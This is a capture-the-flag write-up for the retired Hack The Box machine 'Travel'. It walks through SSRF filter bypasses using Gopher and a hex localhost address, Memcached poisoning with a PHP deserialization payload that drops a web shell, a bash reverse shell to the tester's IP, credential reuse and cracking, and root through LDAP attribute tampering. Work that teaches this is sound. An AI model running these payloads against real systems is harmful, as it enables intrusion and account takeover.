# Travel

This is the write-up for the box Travel that got retired at the 12th September 2020.
My IP address was 10.10.14.6 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.189    travel.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/travel.nmap 10.10.10.189
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  3072 d3:9f:31:95:7e:5e:11:45:a2:b4:b6:34:c0:2d:2d:bc (RSA)
80/tcp  open  http     nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http nginx 1.17.6
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Not valid before: 2020-04-23T19:24:29
|_Not valid after:  2030-04-21T19:24:29
|_http-server-header: nginx/1.17.6
|_ssl-date: TLS randomness does not represent time
|_http-title: Travel.HTB - SSL coming soon.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The SSL certificate on port 443 discloses some DNS names, that should be added to the _/etc/hosts_ file:
- www.travel.htb
- blog.travel.htb
- blog-dev.travel.htb

## Checking HTTPS (Port 443)

The HTTPS web pages on all domains that are found in the SSL certificate all show the same information:
```
We are currently sorting out how to get SSL implemented with multiple domains properly.
Also we are experiencing severe performance problems on SSL still.

In the meantime please use our non-SSL websites.

Thanks for your understanding,
admin
```

As the note states, the other hostnames should be accessible on the non-SSL websites.

## Checking HTTP (Port 80)

The web page on _travel.htb_ has no interesting content or hints other than that it was built with a template from [TemplateMag](https://templatemag.com/).

The domain on _blog.travel.htb_ forwards to a blog page that is built with **WordPress**.
There is only one blog article that mentions a new RSS feature:
```
Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!
```

The RSS feature can be found on the top right corner that forwards to _/awesome-rss_.

The domain on _blog-dev.travel.htb_ resolves in a HTTP status code _403 Forbidden_.
Lets search for hidden directories with **Gobuster**:
```
gobuster -u http://blog-dev.travel.htb dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
```

It finds a _/.git_ directory which still resolves in HTTP status code _403 Forbidden_ but files in there can be read if the structure of a Git repository is known:
```
curl http://blog-dev.travel.htb/.git/config
```
```
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
```

With the tool [git-dumper](https://github.com/arthaud/git-dumper) the repository can be downloaded:
```
git_dumper.py http://blog-dev.travel.htb/.git blog-dev_travel_git/
```

It downloads three files:
- _README.MD_

```
# Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup

* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php & template.php to `wp-content/themes/twentytwenty`
* create logs directory in `wp-content/themes/twentytwenty`
* create page in backend and choose rss_template.php as theme

## Changelog

- temporarily disabled cache compression
- added additional security checks
- added caching
- added rss template

## ToDo

- finish logging implementation
```

- _rss_template.php_
- _template.php_

The _README.MD_ explains the setup of the other files and on the **WordPress** page the directory _wp-content/themes/twentytwenty/_ and the files can be accessed, but all show a blank page:
```
http://blog.travel.htb/wp-content/themes/twentytwenty/
http://blog.travel.htb/wp-content/themes/twentytwenty/template.php
http://blog.travel.htb/wp-content/themes/twentytwenty/rss_template.php
```

The directory _wp-content/themes/twentytwenty/logs_ does exist and resolves in a HTTP status code _403 Forbidden_.

## Analyzing PHP Files

Analyzing the PHP file _template.php_:
```
grep 'system\|exec\|shell\|select\|serial' *
```
```
(...)
function url_get_contents ($url) {
    $url = safe($url);
        $url = escapeshellarg($url);
        $pl = "curl ".$url;
        $output = shell_exec($pl);
    return $output;
(...)
```

The function _url_get_contents_ calls the function _safe_ that tries to prevent some web application attacks:
- Prevents usage of `file://` and `@` for **LFI**
  - Could be bypassed by using **Gopher**
- Prevents usage of _"-o"_ and _"-F"_ for **Command Injection**
- Prevents usage of _localhost_ and _127.0.0.1_ for **SSRF**
  - Can be bypassed by using using hexadecimal form of 127.0.0.1: _0x7f000001_

Searching where the function _url_get_contents_ is called:
```
grep url_get_contents *
```
```
rss_template.php:     $data = url_get_contents($url);
```

The file _rss_template.php_ has the template name _Awesome RSS_ and this was found earlier in _/awesome-rss_.
If the argument _debug_ is used on there, it will call _debug.php_:
```
if (isset($_GET['debug'])){
  include('debug.php);
```

When browsing to _/awesome-rss_ and using the argument _debug_, there will be a comment in the HTML source code with a **PHP serialized object**:
```
http://blog.travel.htb/awesome-rss/?debug=test
```
```
DEBUG
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```

The PHP file _debug.php_ is also placed in _wp-content/themes/twentytwenty/_ and can be called from there.

Now it has to be found out if there is a way for user input so the server calls back to us and it may be possible to manipulate the PHP serialized object.

In _rss_template.php_ is a line that gets information from a specified URL if the argument _custom_feed_url_ is not used:
```
(...)
$url = $_SERVER['QUERY_STRING'];
if(strpos($url, "custom_feed_url") !== false){
    $tmp = (explode("=", $url));    
    $url = end($tmp);       
} else {
    $url = "http://www.travel.htb/newsfeed/customfeed.xml";
  }
(...)
```

So when the _custom_feed_url_ argument is used, our local client can be specified to download data from us:
```
GET /awesome-rss/?custom_feed_url=http://10.10.14.6/testfile HTTP/1.1
Host: blog.travel.htb
(...)
```

Our local web server gets a connection back and proofs that this is a way to make the box connect to our client.

The string _"xct"_ is mentioned in _rss_template.php_ when it sets the cache location to a **Memcached** service on the localhost of the box:
```
(...)
if ($url) {
         $simplepie = new SimplePie();
         $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
(...)
```

It uses [SimplePie](https://simplepie.org/) as the feed parser to cache objects from **Memcached**.

### Exploiting Web Server

The [source code of SimplePie](https://github.com/WordPress/WordPress/tree/master/wp-includes/SimplePie) will explain how the string gets generated.

First we need to figure out how the first part is generated, because the objects will only trigger on the page they are.
After getting that, a PHP object can be deserialized to get code execution.

Generating the MD5 hash for _/newsfeed/customfeed.xml_:
```
echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum

3903a76d1e6fef0d76e973a0561cbfc0
```
```
echo -n '3903a76d1e6fef0d76e973a0561cbfc0:spc' | md5sum

4e5612ba079c530a6b1f148c0b352241
```

This is the full MD5 hash of the string that was found earlier _"xct_4e5612ba07"_.

The next step is to send a poisoned cookie to the **Memcached** service.
As there are some filters on _template.php_ that make **SSRF** harder, those have to be bypassed.

Bypassing the 127.0.0.1-filter by using hexadecimal:
```
GET /awesome-rss/?custom_feed_url=http://0x7F000001:11211/ HTTP/1.1
Host: blog.travel.htb
```

The block of _file://_ can be bypassed by using **Gopher** as the protocol.
The tool [Gopherus](https://github.com/tarunkant/Gopherus) will help to generate Gopher payloads:
```
gopherus.py --exploit phpmemcache

example: O:5:"Hello":0:{}   : test

Your gopher link is ready to do SSRF :
gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%204%0d%0atest%0d%0a
```

Sending the malicious payload to the local **Memcached** by abusing **SSRF vulnerability**:
```
GET /awesome-rss/?custom_feed_url=gopher://0x7F000001:11211/_%0d%0aset%20SpyD3r%204%200%204%0d%0atest%0d%0a HTTP/1.1
Host: blog.travel.htb
```

The PHP serialized object is now poisoned:
```
GET /wp-content/themes/twentytwenty/debug.php HTTP/1.1
Host: blog.travel.htb
```
```
~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
| SpyD3r | test |
~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

Making the first string useful by using the MD5 hash there:
```
GET /awesome-rss/?custom_feed_url=gopher://0x7F000001:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%204%0d%0atest%0d%0a HTTP/1.1
Host: blog.travel.htb
```
```
GET /wp-content/themes/twentytwenty/debug.php HTTP/1.1
Host: blog.travel.htb
```
```
| xct_4e5612ba07(...) | test |
```

Now a payload is needed as the PHP serialized object to execute code:
```php
class TemplateHelper
{

    public $file;
    public $data;

    public function __construct(string $file, string $data)
    {
        $this->init($file, $data);
    }

    private function init(string $file, string $data)
    {    
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}

$payload = new TemplateHelper("test.php", "<?php system(\$_REQUEST['cmd']); ?>");
echo serialize($payload)
```

Executing the payload:
```
php payload.php
```
```
O:14:"TemplateHelper":2:{s:4:"file";s:8:"test.php";s:4:"data";s:34:"<?php system($_REQUEST['cmd']); ?>";}
```

Using the payload with **Gopherus**:
```
gopherus.py --exploit phpmemcache

example: O:5:"Hello":0:{}   : O:14:"TemplateHelper":2:{s:4:"file";s:8:"test.php";s:4:"data";s:34:"<?php system($_REQUEST['cmd']); ?>";}

Your gopher link is ready to do SSRF :
gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20105%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22test.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
```

Replacing _"SpyD3r"_ with the MD5 hash and sending the payload:
```
GET /awesome-rss/?custom_feed_url=gopher://0x7F000001:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20105%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22test.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a HTTP/1.1
```

Checking if the correct object is created:
```
GET /wp-content/themes/twentytwenty/debug.php HTTP/1.1
```
```
| xct_4e5612ba07(...) | O:14:"TemplateHelper":2:{s:4:"file(...) |
```

Browsing to _awesome-rss_ to trigger the function that parses the PHP object:
```
GET /awesome-rss/ HTTP/1.1
```

Testing command execution on the web shell:
```
GET /wp-content/themes/twentytwenty/logs/test.php?cmd=whoami HTTP/1.1
```
```
www-data
```

The system command `whoami` gets executed and command execution is proofed, so lets start a reverse shell:
```
GET /wp-content/themes/twentytwenty/logs/test.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001 0>&1'
```

After URL-encoding the request and sending it, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

## Privilege Escalation

The IP address of this box is 172.30.0.10, the hostname is _blog_ and there are no home folders.
In the root directory is the folder _.dockerenv_ which means that this is a container.

The file _/var/www/html/wp-config.php_ contains credentials for the **MySQL database**:
```
/** The name of the database for WordPress */
define( 'DB_NAME', 'wp' );

/** MySQL database username */
define( 'DB_USER', 'wp' );

/** MySQL database password */
define( 'DB_PASSWORD', 'fiFtDDV9LYe8Ti' );
```

Login into the database:
```
mysql -u wp -p
```

Enumerating the database:
```
MariaDB [(none)]> show databases;
MariaDB [(none)]> use wp;
MariaDB [wp]> show tables;
MariaDB [wp]> select user_login, user_pass from wp_users;

+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ |
+------------+------------------------------------+
```

Trying to crack the password hash with **Hashcat**:
```
hashcat -m 400 travel_mysql.hash /usr/share/wordlists/rockyou.txt
```

It does not get cracked.

There is a file _/opt/wordpress/backup-13-04-2020.sql_ that contains another password hash at the end of the file for the user _lynik-admin_:
```
(1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin')
(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
```

After trying to crack the hash of the user _lynik-admin_ it gets cracked and the password is:
> 1stepcloser

These credentials work to SSH into the box:
```
ssh lynik-admin@10.10.10.189
```

### Privilege Escalation to root

In the home directory of _lyrik-admin_ are some files that are not default.

The file _.viminfo_ contains a potential password:
```
(...)
BINDPW Theroadlesstraveled
|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"
(...)
```

Bind passwords are used in **LDAP** and the other file _.ldaprc_ has some LDAP information about the domain:
```
HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```

Dumping all information out of the LDAP database:
```
ldapsearch -x -w Theroadlesstraveled
```

Changing passwords of the users will not be valuable as the configuration for SSH states in the file _/etc/ssh/sshd_config_ that only password authentication is only allowed for two users:
```
PasswordAuthentication no

# Enable password access for admins in case key auth fails.
Match User trvl-admin,lynik-admin
        PasswordAuthentication yes
```

This means that SSH keys are needed and the attributes modified accordingly.

Generating a new SSH key on our local client:
```
ssh-keygen -f lynik.key
```

Changing the password of the user _lynik_:
```
ldapmodify -x -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled
```
```
dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
add: userPassword
userPassword: NewPass123
```

Adding new object _ldapPublicKey_ attribute to the user _lynik_:
```
dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
add: objectClass
objectClass: ldapPublicKey
```

Adding _sshPublicKey_ attribute to the user _lynik_ with the contents of the created public key:
```
dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
add: sshPublicKey
sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB(...)
```

Modifying the _gidNumber_ attribute to the number of _sudo_ (27):
```
dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: gidNumber
gidNumber: 27
```

Using SSH to connect to the box as _lynik_:
```
ssh -i lynik.key lynik@10.10.10.189
```

The user is now in the group _sudo_ and can run `sudo` with the newly set password to switch users to root:
```
sudo su -
```
